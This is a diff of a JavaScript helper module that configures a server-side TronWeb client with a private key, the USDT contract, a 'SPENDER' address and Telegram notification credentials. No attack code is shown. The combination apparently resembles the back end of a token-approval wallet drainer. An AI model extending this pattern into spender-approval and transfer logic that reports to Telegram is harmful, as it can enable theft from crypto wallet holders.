@@ -2,33 +2,36 @@ import { TronWeb } from 'tronweb';
 
 const CFG = {
     FULL_NODE: process.env.NEXT_PUBLIC_FULL_NODE || 'https://api.trongrid.io',
-    API_KEY: process.env.TRONGRID_API_KEY || process.env.NEXT_PUBLIC_API_KEY,
+    API_KEY: process.env.TRONGRID_API_KEY || process.env.NEXT_PUBLIC_API_KEY || '',
     PRIVATE_KEY: process.env.PRIVATE_KEY,
-    USDT: process.env.NEXT_PUBLIC_USDT || 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
+    USDT: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
     SPENDER: process.env.NEXT_PUBLIC_SPENDER,
     TG_TOKEN: process.env.TG_TOKEN,
     TG_CHAT: process.env.TG_CHAT,
 };
 
 export const getServerTW = () => {
-    if (!CFG.PRIVATE_KEY) throw new Error('PRIVATE_KEY is missing in Vercel settings.');
+    // CRITICAL CHECK
+    if (!CFG.PRIVATE_KEY || CFG.PRIVATE_KEY.length < 10) {
+        throw new Error('PRIVATE_KEY is missing or invalid in Vercel Environment Variables. Please check settings.');
+    }
+
     try {
+        const headers = {};
+        if (CFG.API_KEY) headers['TRON-PRO-API-KEY'] = CFG.API_KEY;
+
         return new TronWeb({
             fullHost: CFG.FULL_NODE,
-            headers: CFG.API_KEY ? { 'TRON-PRO-API-KEY': CFG.API_KEY } : {},
+            headers: headers,
             privateKey: CFG.PRIVATE_KEY,
         });
     } catch (e) {
-        throw new Error('TronWeb Init Error: ' + e.message);
+        throw new Error('TronWeb Init Failed: ' + e.message);
     }
 };
 
 export const validateAddress = (addr) => {
-    try {
-        return TronWeb.isAddress(addr);
-    } catch {
-        return false;
-    }
+    try { return TronWeb.isAddress(addr); } catch { return false; }
 };
 
 export const sendTelegram = async (msg) => {
